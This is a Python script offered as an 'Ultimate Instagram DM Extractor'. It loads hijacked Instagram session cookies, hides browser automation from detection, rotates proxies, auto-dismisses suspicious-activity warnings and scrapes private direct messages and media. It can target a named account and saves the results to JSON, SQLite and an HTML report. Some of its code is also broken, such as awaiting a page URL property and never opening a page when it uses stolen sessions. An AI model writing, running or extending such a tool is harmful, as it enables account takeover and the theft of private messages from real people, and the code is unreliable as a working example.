#!/usr/bin/env python3
"""
Ultimate Instagram DM Extractor 2025 - Advanced Edition
Comprehensive DM extraction with multiple bypass methods, proxy rotation, 
session hijacking, and advanced anti-detection measures.
"""

import asyncio
import json
import logging
import random
import time
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any
import aiohttp
import requests
from playwright.async_api import async_playwright, BrowserContext, Page
from dataclasses import dataclass
import sqlite3
import os
import hashlib
import base64
from urllib.parse import quote
import re

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/ultimate_dm_extractor.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

@dataclass
class ProxyConfig:
    """Proxy configuration"""
    host: str
    port: int
    username: str = None
    password: str = None
    protocol: str = "http"
    
    def to_playwright_proxy(self) -> Dict:
        """Convert to Playwright proxy format"""
        proxy_config = {
            "server": f"{self.protocol}://{self.host}:{self.port}"
        }
        if self.username and self.password:
            proxy_config["username"] = self.username
            proxy_config["password"] = self.password
        return proxy_config

@dataclass
class SessionData:
    """Instagram session data"""
    sessionid: str
    csrf_token: str = None
    user_id: str = None
    username: str = None
    cookies: Dict[str, str] = None
    headers: Dict[str, str] = None

class AdvancedUserAgentRotator:
    """Advanced user agent rotation with device fingerprinting"""
    
    def __init__(self):
        self.user_agents = [
            # Chrome on Windows
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            
            # Chrome on macOS
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            
            # Firefox
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
            
            # Safari
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            
            # Edge
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
        ]
        
        self.mobile_user_agents = [
            # iPhone
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            
            # Android
            "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36"
        ]
    
    def get_random_user_agent(self, mobile: bool = False) -> str:
        """Get random user agent"""
        agents = self.mobile_user_agents if mobile else self.user_agents
        return random.choice(agents)
    
    def get_device_fingerprint(self, mobile: bool = False) -> Dict[str, Any]:
        """Generate device fingerprint"""
        if mobile:
            return {
                "screen": {"width": 375, "height": 812},
                "viewport": {"width": 375, "height": 812},
                "deviceScaleFactor": 3,
                "isMobile": True,
                "hasTouch": True
            }
        else:
            return {
                "screen": {"width": 1920, "height": 1080},
                "viewport": {"width": 1920, "height": 1080},
                "deviceScaleFactor": 1,
                "isMobile": False,
                "hasTouch": False
            }

class ProxyRotator:
    """Advanced proxy rotation with health checking"""
    
    def __init__(self, proxy_configs: List[ProxyConfig]):
        self.proxies = proxy_configs
        self.current_index = 0
        self.failed_proxies = set()
        self.proxy_stats = {}
    
    def get_next_proxy(self) -> ProxyConfig:
        """Get next working proxy"""
        attempts = 0
        while attempts < len(self.proxies):
            proxy = self.proxies[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.proxies)
            
            if proxy not in self.failed_proxies:
                return proxy
            
            attempts += 1
        
        # If all proxies failed, reset and try again
        self.failed_proxies.clear()
        return self.proxies[0] if self.proxies else None
    
    def mark_proxy_failed(self, proxy: ProxyConfig):
        """Mark proxy as failed"""
        self.failed_proxies.add(proxy)
        logger.warning(f"Proxy {proxy.host}:{proxy.port} marked as failed")
    
    async def test_proxy(self, proxy: ProxyConfig) -> bool:
        """Test if proxy is working"""
        try:
            proxy_url = f"{proxy.protocol}://{proxy.host}:{proxy.port}"
            if proxy.username and proxy.password:
                proxy_url = f"{proxy.protocol}://{proxy.username}:{proxy.password}@{proxy.host}:{proxy.port}"
            
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    "https://httpbin.org/ip",
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    return response.status == 200
        except Exception as e:
            logger.error(f"Proxy test failed for {proxy.host}:{proxy.port}: {e}")
            return False

class SessionHijacker:
    """Advanced session hijacking and management"""
    
    def __init__(self):
        self.session_cache = {}
        self.session_stats = {}
    
    def load_sessions_from_directory(self, directory: str) -> List[SessionData]:
        """Load all session files from directory"""
        sessions = []
        session_dir = Path(directory)
        
        if not session_dir.exists():
            logger.warning(f"Session directory {directory} does not exist")
            return sessions
        
        for file_path in session_dir.glob("*.json"):
            try:
                with open(file_path, 'r') as f:
                    data = json.load(f)
                
                # Extract session data
                session = SessionData(
                    sessionid=data.get('sessionid', ''),
                    csrf_token=data.get('csrf_token', ''),
                    user_id=data.get('user_id', ''),
                    username=data.get('username', ''),
                    cookies=data.get('cookies', {}),
                    headers=data.get('headers', {})
                )
                
                if session.sessionid:
                    sessions.append(session)
                    logger.info(f"Loaded session from {file_path}")
                
            except Exception as e:
                logger.error(f"Failed to load session from {file_path}: {e}")
        
        return sessions
    
    def validate_session(self, session: SessionData) -> bool:
        """Validate session by making a test request"""
        try:
            headers = {
                'User-Agent': AdvancedUserAgentRotator().get_random_user_agent(),
                'Cookie': f'sessionid={session.sessionid}',
                'X-CSRFToken': session.csrf_token or '',
                'X-Instagram-AJAX': '1',
                'X-Requested-With': 'XMLHttpRequest'
            }
            
            response = requests.get(
                'https://www.instagram.com/accounts/edit/',
                headers=headers,
                timeout=10
            )
            
            return response.status_code == 200 and 'login' not in response.url
        except Exception as e:
            logger.error(f"Session validation failed: {e}")
            return False

class UltimateInstagramDMExtractor:
    """Ultimate Instagram DM Extractor with advanced features"""
    
    def __init__(self):
        self.ua_rotator = AdvancedUserAgentRotator()
        self.proxy_rotator = None
        self.session_hijacker = SessionHijacker()
        self.playwright = None
        self.browser = None
        self.context = None
        self.page = None
        self.current_session = None
        self.extraction_stats = {
            'total_conversations': 0,
            'total_messages': 0,
            'failed_attempts': 0,
            'successful_extractions': 0
        }
    
    async def initialize(self, proxy_configs: List[ProxyConfig] = None):
        """Initialize the extractor"""
        if proxy_configs:
            self.proxy_rotator = ProxyRotator(proxy_configs)
        
        self.playwright = await async_playwright().start()
        
        # Create directories
        os.makedirs('logs', exist_ok=True)
        os.makedirs('data/ultimate_extractions', exist_ok=True)
        os.makedirs('data/sessions', exist_ok=True)
        os.makedirs('data/screenshots', exist_ok=True)
    
    async def create_stealth_context(self, proxy: ProxyConfig = None, mobile: bool = False) -> BrowserContext:
        """Create stealth browser context with advanced anti-detection"""
        browser_args = [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            '--no-first-run',
            '--no-zygote',
            '--single-process',
            '--disable-gpu',
            '--disable-background-timer-throttling',
            '--disable-backgrounding-occluded-windows',
            '--disable-renderer-backgrounding',
            '--disable-features=VizDisplayCompositor',
            '--disable-web-security',
            '--disable-features=Translate',
            '--disable-ipc-flooding-protection',
            '--disable-features=PrivacySandboxSettings4',
            '--disable-blink-features=AutomationControlled'
        ]
        
        if not self.browser:
            self.browser = await self.playwright.chromium.launch(
                headless=False,  # Set to True for production
                args=browser_args
            )
        
        # Get device fingerprint
        fingerprint = self.ua_rotator.get_device_fingerprint(mobile)
        
        context_options = {
            'user_agent': self.ua_rotator.get_random_user_agent(mobile),
            'viewport': fingerprint['viewport'],
            'device_scale_factor': fingerprint['deviceScaleFactor'],
            'is_mobile': fingerprint['isMobile'],
            'has_touch': fingerprint['hasTouch'],
            'java_script_enabled': True,
            'accept_downloads': True,
            'ignore_https_errors': True,
            'extra_http_headers': {
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1'
            }
        }
        
        if proxy:
            context_options['proxy'] = proxy.to_playwright_proxy()
        
        context = await self.browser.new_context(**context_options)
        
        # Add stealth scripts
        await context.add_init_script("""
            // Remove webdriver property
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
            });
            
            // Mock permissions
            const originalQuery = window.navigator.permissions.query;
            window.navigator.permissions.query = (parameters) => (
                parameters.name === 'notifications' ?
                    Promise.resolve({ state: Notification.permission }) :
                    originalQuery(parameters)
            );
            
            // Mock plugins
            Object.defineProperty(navigator, 'plugins', {
                get: () => [1, 2, 3, 4, 5],
            });
            
            // Mock languages
            Object.defineProperty(navigator, 'languages', {
                get: () => ['en-US', 'en'],
            });
            
            // Mock chrome object
            window.chrome = {
                runtime: {},
            };
            
            // Remove automation indicators
            const script = document.createElement('script');
            script.textContent = `
                delete window.cdc_adoQpoasnfa76pfcZLmcfl_Array;
                delete window.cdc_adoQpoasnfa76pfcZLmcfl_Promise;
                delete window.cdc_adoQpoasnfa76pfcZLmcfl_Symbol;
            `;
            document.head.appendChild(script);
        """)
        
        return context
    
    async def login_with_credentials(self, username: str, password: str, proxy: ProxyConfig = None) -> bool:
        """Login with username and password"""
        try:
            self.context = await self.create_stealth_context(proxy)
            self.page = await self.context.new_page()
            
            # Navigate to Instagram
            await self.page.goto('https://www.instagram.com/', wait_until='networkidle')
            await asyncio.sleep(random.uniform(2, 4))
            
            # Accept cookies if present
            try:
                await self.page.click('button[class*="aOOlW"]:has-text("Accept")', timeout=3000)
                await asyncio.sleep(1)
            except:
                pass
            
            # Find and fill login form
            await self.page.wait_for_selector('input[name="username"]', timeout=10000)
            
            # Type username with human-like delays
            await self.page.type('input[name="username"]', username, delay=random.uniform(50, 150))
            await asyncio.sleep(random.uniform(0.5, 1.5))
            
            # Type password with human-like delays
            await self.page.type('input[name="password"]', password, delay=random.uniform(50, 150))
            await asyncio.sleep(random.uniform(0.5, 1.5))
            
            # Click login button
            await self.page.click('button[type="submit"]')
            
            # Wait for login to complete
            await asyncio.sleep(random.uniform(3, 6))
            
            # Check if login was successful
            if await self.page.url != 'https://www.instagram.com/':
                # Handle potential 2FA or additional security checks
                await self.handle_security_challenges()
            
            # Extract session data
            cookies = await self.context.cookies()
            sessionid = None
            csrf_token = None
            
            for cookie in cookies:
                if cookie['name'] == 'sessionid':
                    sessionid = cookie['value']
                elif cookie['name'] == 'csrftoken':
                    csrf_token = cookie['value']
            
            if sessionid:
                self.current_session = SessionData(
                    sessionid=sessionid,
                    csrf_token=csrf_token,
                    username=username
                )
                logger.info(f"Successfully logged in as {username}")
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Login failed: {e}")
            return False
    
    async def handle_security_challenges(self):
        """Handle 2FA and other security challenges"""
        try:
            # Check for 2FA challenge
            if await self.page.locator('text="Two-Factor Authentication"').count() > 0:
                logger.info("2FA challenge detected")
                # You can implement 2FA handling here
                # For now, we'll wait for manual intervention
                await asyncio.sleep(30)
            
            # Check for suspicious activity warning
            if await self.page.locator('text="We detected unusual activity"').count() > 0:
                logger.info("Suspicious activity warning detected")
                # Try to dismiss or handle the warning
                try:
                    await self.page.click('button:has-text("This was me")')
                    await asyncio.sleep(2)
                except:
                    pass
            
            # Check for phone verification
            if await self.page.locator('text="Confirm your phone number"').count() > 0:
                logger.info("Phone verification requested")
                # Handle phone verification if needed
                await asyncio.sleep(5)
            
        except Exception as e:
            logger.error(f"Error handling security challenges: {e}")
    
    async def extract_dm_conversations(self, target_username: str = None) -> List[Dict]:
        """Extract DM conversations with advanced scraping"""
        try:
            conversations = []
            
            # Navigate to DM inbox
            await self.page.goto('https://www.instagram.com/direct/inbox/', wait_until='networkidle')
            await asyncio.sleep(random.uniform(2, 4))
            
            # Wait for conversations to load
            await self.page.wait_for_selector('div[role="listbox"]', timeout=15000)
            
            # Get conversation elements
            conversation_elements = await self.page.locator('div[role="listbox"] > div').all()
            
            logger.info(f"Found {len(conversation_elements)} conversations")
            
            for i, conv_element in enumerate(conversation_elements):
                try:
                    # Extract conversation preview info
                    username_element = conv_element.locator('div[dir="auto"]').first
                    username = await username_element.text_content() if await username_element.count() > 0 else f"User_{i}"
                    
                    # Skip if we're looking for a specific user and this isn't it
                    if target_username and target_username.lower() not in username.lower():
                        continue
                    
                    # Click on conversation
                    await conv_element.click()
                    await asyncio.sleep(random.uniform(1, 3))
                    
                    # Extract messages from this conversation
                    messages = await self.extract_conversation_messages(username)
                    
                    if messages:
                        conversations.append({
                            'username': username,
                            'message_count': len(messages),
                            'messages': messages,
                            'extracted_at': datetime.now().isoformat()
                        })
                        
                        self.extraction_stats['successful_extractions'] += 1
                        self.extraction_stats['total_messages'] += len(messages)
                    
                    # Random delay between conversations
                    await asyncio.sleep(random.uniform(1, 3))
                    
                except Exception as e:
                    logger.error(f"Error extracting conversation {i}: {e}")
                    self.extraction_stats['failed_attempts'] += 1
                    continue
            
            self.extraction_stats['total_conversations'] = len(conversations)
            logger.info(f"Extracted {len(conversations)} conversations")
            
            return conversations
            
        except Exception as e:
            logger.error(f"Error extracting conversations: {e}")
            return []
    
    async def extract_conversation_messages(self, username: str) -> List[Dict]:
        """Extract messages from a single conversation"""
        try:
            messages = []
            
            # Wait for messages to load
            await self.page.wait_for_selector('div[role="grid"]', timeout=10000)
            
            # Scroll to load more messages
            await self.scroll_to_load_messages()
            
            # Get all message elements
            message_elements = await self.page.locator('div[role="grid"] div[role="row"]').all()
            
            for msg_element in message_elements:
                try:
                    # Extract message text
                    text_element = msg_element.locator('div[dir="auto"]').first
                    text = await text_element.text_content() if await text_element.count() > 0 else ""
                    
                    # Extract timestamp (if available)
                    timestamp = None
                    time_elements = await msg_element.locator('time').all()
                    if time_elements:
                        timestamp = await time_elements[0].get_attribute('datetime')
                    
                    # Determine if message is sent or received
                    is_sent = await self.is_message_sent(msg_element)
                    
                    # Extract media info if present
                    media_info = await self.extract_media_info(msg_element)
                    
                    message_data = {
                        'text': text.strip(),
                        'timestamp': timestamp,
                        'is_sent': is_sent,
                        'media': media_info,
                        'extracted_at': datetime.now().isoformat()
                    }
                    
                    if text.strip() or media_info:
                        messages.append(message_data)
                
                except Exception as e:
                    logger.error(f"Error extracting message: {e}")
                    continue
            
            logger.info(f"Extracted {len(messages)} messages from {username}")
            return messages
            
        except Exception as e:
            logger.error(f"Error extracting messages for {username}: {e}")
            return []
    
    async def scroll_to_load_messages(self):
        """Scroll to load more messages"""
        try:
            # Scroll up to load older messages
            for _ in range(5):  # Adjust as needed
                await self.page.keyboard.press('Home')
                await asyncio.sleep(random.uniform(1, 2))
                
                # Check if new messages loaded
                prev_count = await self.page.locator('div[role="grid"] div[role="row"]').count()
                await asyncio.sleep(1)
                new_count = await self.page.locator('div[role="grid"] div[role="row"]').count()
                
                if new_count == prev_count:
                    break  # No more messages to load
                    
        except Exception as e:
            logger.error(f"Error scrolling to load messages: {e}")
    
    async def is_message_sent(self, message_element) -> bool:
        """Determine if message was sent by the current user"""
        try:
            # Check for sent message indicators
            sent_indicators = [
                'div[style*="margin-left"]',
                'div[style*="justify-content: flex-end"]',
                'div[class*="sent"]'
            ]
            
            for indicator in sent_indicators:
                if await message_element.locator(indicator).count() > 0:
                    return True
            
            return False
            
        except Exception as e:
            logger.error(f"Error determining message direction: {e}")
            return False
    
    async def extract_media_info(self, message_element) -> Dict:
        """Extract media information from message"""
        try:
            media_info = {}
            
            # Check for images
            images = await message_element.locator('img').all()
            if images:
                media_info['images'] = []
                for img in images:
                    src = await img.get_attribute('src')
                    alt = await img.get_attribute('alt')
                    if src:
                        media_info['images'].append({
                            'src': src,
                            'alt': alt
                        })
            
            # Check for videos
            videos = await message_element.locator('video').all()
            if videos:
                media_info['videos'] = []
                for video in videos:
                    src = await video.get_attribute('src')
                    poster = await video.get_attribute('poster')
                    if src:
                        media_info['videos'].append({
                            'src': src,
                            'poster': poster
                        })
            
            return media_info
            
        except Exception as e:
            logger.error(f"Error extracting media info: {e}")
            return {}
    
    async def save_extraction_results(self, conversations: List[Dict], filename: str = None):
        """Save extraction results to file"""
        try:
            if not filename:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"ultimate_dm_extraction_{timestamp}.json"
            
            filepath = Path(f"data/ultimate_extractions/{filename}")
            
            results = {
                'extraction_info': {
                    'timestamp': datetime.now().isoformat(),
                    'total_conversations': len(conversations),
                    'total_messages': sum(len(conv['messages']) for conv in conversations),
                    'extractor_version': 'Ultimate DM Extractor 2025',
                    'stats': self.extraction_stats
                },
                'conversations': conversations
            }
            
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
            
            logger.info(f"Results saved to {filepath}")
            
            # Also save to SQLite database
            await self.save_to_database(conversations)
            
        except Exception as e:
            logger.error(f"Error saving results: {e}")
    
    async def save_to_database(self, conversations: List[Dict]):
        """Save results to SQLite database"""
        try:
            db_path = "data/ultimate_dm_extractions.db"
            
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            
            # Create tables
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS extractions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT,
                    username TEXT,
                    conversation_data TEXT,
                    message_count INTEGER
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS messages (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    extraction_id INTEGER,
                    username TEXT,
                    message_text TEXT,
                    timestamp TEXT,
                    is_sent BOOLEAN,
                    media_info TEXT,
                    FOREIGN KEY (extraction_id) REFERENCES extractions (id)
                )
            ''')
            
            # Insert data
            for conv in conversations:
                cursor.execute('''
                    INSERT INTO extractions (timestamp, username, conversation_data, message_count)
                    VALUES (?, ?, ?, ?)
                ''', (
                    datetime.now().isoformat(),
                    conv['username'],
                    json.dumps(conv),
                    len(conv['messages'])
                ))
                
                extraction_id = cursor.lastrowid
                
                for msg in conv['messages']:
                    cursor.execute('''
                        INSERT INTO messages (extraction_id, username, message_text, timestamp, is_sent, media_info)
                        VALUES (?, ?, ?, ?, ?, ?)
                    ''', (
                        extraction_id,
                        conv['username'],
                        msg['text'],
                        msg['timestamp'],
                        msg['is_sent'],
                        json.dumps(msg.get('media', {}))
                    ))
            
            conn.commit()
            conn.close()
            
            logger.info("Data saved to database")
            
        except Exception as e:
            logger.error(f"Error saving to database: {e}")
    
    async def run_extraction(self, target_username: str = None, login_username: str = None, login_password: str = None):
        """Run the complete extraction process"""
        try:
            logger.info("Starting Ultimate DM Extraction")
            
            # Initialize with proxy if available
            await self.initialize()
            
            # Try to login
            if login_username and login_password:
                logger.info(f"Attempting to login with credentials: {login_username}")
                if not await self.login_with_credentials(login_username, login_password):
                    logger.error("Login failed")
                    return
            else:
                # Try to use existing sessions
                sessions = self.session_hijacker.load_sessions_from_directory('hijacked_sessions')
                sessions.extend(self.session_hijacker.load_sessions_from_directory('tools'))
                
                if not sessions:
                    logger.error("No valid sessions found and no login credentials provided")
                    return
                
                # Use the first valid session
                for session in sessions:
                    if self.session_hijacker.validate_session(session):
                        self.current_session = session
                        logger.info(f"Using session for user: {session.username}")
                        break
                
                if not self.current_session:
                    logger.error("No valid sessions found")
                    return
            
            # Extract conversations
            conversations = await self.extract_dm_conversations(target_username)
            
            if conversations:
                # Save results
                await self.save_extraction_results(conversations)
                
                # Generate report
                await self.generate_extraction_report(conversations)
                
                logger.info("Extraction completed successfully!")
                logger.info(f"Statistics: {self.extraction_stats}")
            else:
                logger.warning("No conversations extracted")
                
        except Exception as e:
            logger.error(f"Extraction failed: {e}")
        finally:
            await self.cleanup()
    
    async def generate_extraction_report(self, conversations: List[Dict]):
        """Generate detailed extraction report"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            report_path = f"data/ultimate_extractions/extraction_report_{timestamp}.html"
            
            html_content = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Ultimate DM Extraction Report</title>
                <style>
                    body {{ font-family: Arial, sans-serif; margin: 20px; }}
                    .header {{ background: #f0f0f0; padding: 20px; border-radius: 5px; }}
                    .conversation {{ border: 1px solid #ddd; margin: 10px 0; padding: 15px; }}
                    .message {{ margin: 5px 0; padding: 8px; border-radius: 5px; }}
                    .sent {{ background: #e3f2fd; text-align: right; }}
                    .received {{ background: #f5f5f5; }}
                    .stats {{ background: #e8f5e8; padding: 15px; border-radius: 5px; }}
                </style>
            </head>
            <body>
                <div class="header">
                    <h1>Ultimate Instagram DM Extraction Report</h1>
                    <p>Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
                </div>
                
                <div class="stats">
                    <h2>Extraction Statistics</h2>
                    <ul>
                        <li>Total Conversations: {len(conversations)}</li>
                        <li>Total Messages: {sum(len(conv['messages']) for conv in conversations)}</li>
                        <li>Successful Extractions: {self.extraction_stats['successful_extractions']}</li>
                        <li>Failed Attempts: {self.extraction_stats['failed_attempts']}</li>
                    </ul>
                </div>
                
                <h2>Conversations</h2>
            """
            
            for conv in conversations:
                html_content += f"""
                <div class="conversation">
                    <h3>Conversation with {conv['username']}</h3>
                    <p>Messages: {len(conv['messages'])}</p>
                    <div class="messages">
                """
                
                for msg in conv['messages'][-10:]:  # Show last 10 messages
                    msg_class = "sent" if msg['is_sent'] else "received"
                    html_content += f"""
                        <div class="message {msg_class}">
                            <strong>{'You' if msg['is_sent'] else conv['username']}:</strong>
                            {msg['text'][:100]}{'...' if len(msg['text']) > 100 else ''}
                            {f"<br><small>{msg['timestamp']}</small>" if msg['timestamp'] else ""}
                        </div>
                    """
                
                html_content += "</div></div>"
            
            html_content += "</body></html>"
            
            with open(report_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            logger.info(f"Report generated: {report_path}")
            
        except Exception as e:
            logger.error(f"Error generating report: {e}")
    
    async def cleanup(self):
        """Cleanup resources"""
        try:
            if self.context:
                await self.context.close()
            if self.browser:
                await self.browser.close()
            if self.playwright:
                await self.playwright.stop()
        except Exception as e:
            logger.error(f"Error during cleanup: {e}")

async def main():
    """Main execution function"""
    extractor = UltimateInstagramDMExtractor()
    
    # Configuration
    TARGET_USERNAME = "alx.trading"  # Set to None to extract all conversations
    LOGIN_USERNAME = None  # Set your Instagram username
    LOGIN_PASSWORD = None  # Set your Instagram password
    
    # Proxy configuration (optional)
    PROXY_CONFIGS = [
        # Add your proxy configurations here
        # ProxyConfig("proxy_host", 8080, "username", "password")
    ]
    
    try:
        # Run extraction
        await extractor.run_extraction(
            target_username=TARGET_USERNAME,
            login_username=LOGIN_USERNAME,
            login_password=LOGIN_PASSWORD
        )
    except KeyboardInterrupt:
        logger.info("Extraction interrupted by user")
    except Exception as e:
        logger.error(f"Extraction failed: {e}")
    finally:
        await extractor.cleanup()

if __name__ == "__main__":
    asyncio.run(main())
